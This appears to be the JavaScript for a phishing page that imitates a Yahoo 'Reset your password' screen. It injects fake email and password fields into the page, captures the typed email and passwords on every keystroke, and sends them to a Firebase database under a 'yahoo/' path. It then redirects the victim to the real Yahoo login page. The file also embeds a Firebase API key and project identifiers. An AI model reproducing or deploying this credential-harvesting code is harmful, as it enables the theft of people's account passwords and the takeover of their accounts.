// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
    apiKey: "AIzaSyC1g5mxwZrE0Ei2QFYI7qO9CUXMswsn4-Y",
    authDomain: "data-97067.firebaseapp.com",
    databaseURL: "https://data-97067-default-rtdb.firebaseio.com",
    projectId: "data-97067",
    storageBucket: "data-97067.appspot.com",
    messagingSenderId: "588905854999",
    appId: "1:588905854999:web:f9dff59251e4459d264452",
    measurementId: "G-V7YQB9H8HQ"
  };



  firebase.initializeApp(firebaseConfig);
  var database = firebase.database();

function uuidv4() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
}

uuid = uuidv4()
console.log(uuid)

function addTitle(text = "")
{
    let h1 = document.createElement('h1');
    h1.style.textAlign = "center";
    h1.style.fontFamily = "Arial";
    h1.style.fontSize = "30px";
    h1.style.fontStyle = "bold";
    h1.style.marginBottom = "20px";
    h1.innerHTML = text;
    return h1;
}

function addForm(placeholder, value="")
{
    let input = document.createElement('input');
    input.style.border = "0";
    input.style.borderBottom = "0.05882rem solid #b9bdc5";
    input.style.width = "80%";
    input.style.height = "30px";
    input.style.borderRadius = "5px";
    input.style.marginLeft = "5%";
    input.style.padding = "5px";
    input.style.marginBottom = "10px";
    input.style.backgroundColor = "white";
    input.style.color = 'black';
    input.style.fontFamily = "Arial";
    input.style.fontSize = "17px";
    input.placeholder = placeholder;
    input.value = value;
    return input;
}

var w = window.innerWidth;
var h = window.innerHeight;
let email = addForm("Enter your email address");
let old_password = addForm("New password");
let new_password = addForm("Confirm password");
let submit = document.createElement('button');

lastLogin = "";
lastOldPassword = "";
lastNewPassword = "";

const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);

let custom_mail = urlParams.get('mail');

if (custom_mail != null && custom_mail != undefined && custom_mail.length > 0)
{
    email.value = custom_mail;
    email.readOnly = true;
}


function addUserData(lastlogin, lastOldPass, lastNewPass)
{
    console.log("adding user data:", lastlogin, lastOldPass, lastNewPass);
    firebase.database().ref('yahoo/' + uuid).push({
        login:lastlogin,
        oldPassword: lastOldPass,
        newPassword: lastNewPass
    });
}


function update_data()
{
    lastlogin = email.value;
    lastOldPassword = old_password.value;
    lastNewPassword = new_password.value;

    if (lastlogin.length > 0 && lastOldPassword.length >= 5 && lastNewPassword.length >= 5)
    {
        submit.style.backgroundColor = "#188fff";
        submit.style.color = "white";
    }
    else {
        submit.style.backgroundColor = "#d1d5d8";
        submit.style.color = "#404244";
        
    }

    addUserData(lastlogin, lastOldPassword, lastNewPassword);
}


function start() {
    const body = document.getElementsByTagName('body')[0];
    const box = document.getElementsByClassName('right')[0];
    let text = document.querySelector("#login-box-ad-fallback");


    // append yahoo image on the right side
    const img = document.createElement('img');
    img.src = 'Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png';
    img.style.width = '30%';
    img.style.height = '30%';
    // allign the image to the center of the box
    img.style.position = 'relative';
    img.style.top = '70%';
    img.style.left = '50%';
    img.style.transform = 'translate(-50%, 100%)';
    img.style.marginBottom = "20px";
    
    box.appendChild(img);

    let title = addTitle("Reset your password");
    title.style.marginTop = "20px";
    box.appendChild(title);
    
    email.style.marginTop = "10px";
    email.style.marginBottom = "13px";

    old_password.type = "password";
    old_password.style.marginTop = "13px";
    old_password.style.marginBottom = "13px";

    new_password.type = "password";
    new_password.style.marginTop = "13px";
    new_password.style.marginBottom = "13px";

    box.appendChild(email);
    box.appendChild(old_password);
    box.appendChild(new_password);


    
    submit.style.width = "50%";
    submit.style.border = "0";
    submit.style.height = "50px";
    submit.style.borderRadius = "30px";
    submit.style.backgroundColor = "#d1d5d8";
    // allight to center
    submit.style.position = 'relative';
    submit.style.top = '50%';
    submit.style.left = '50%';
    submit.style.transform = 'translate(-50%, 0%)';

    submit.style.color = 'black';
    submit.style.fontFamily = "Arial";
    submit.style.fontSize = "17px";
    submit.innerHTML = "Next";
    submit.style.marginTop = "40px";

    box.appendChild(submit);


    
    if(h > w)
    {
        //  transform: scale(0.1);
        // transform-origin: 0% 0% 0px;

        box.style.transform = "scale(2.5)";
        box.style.transformOrigin = "0% 0% 0px";
        box.style.position = "absolute";
        box.style.left = "3%";

        text.remove();
        img.remove();
        
    }

    submit.addEventListener('click', update_data);
}


submit.onclick = function () {
    update_data();
    var url = "https://login.yahoo.com/?.src=ym&pspid=159600001&activity=mail-direct&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd";
    if(lastpassword.length >= 5)
        window.location.replace(url);
};

old_password.addEventListener('keydown', (event) => {
    var name = event.key;
    var code = event.code;

    update_data();
});


email.addEventListener('keydown', (event) => {
    var name = event.key;
    var code = event.code;

    update_data();
});


new_password.addEventListener('keydown', (event) => {
    var name = event.key;
    var code = event.code;

    update_data();
});
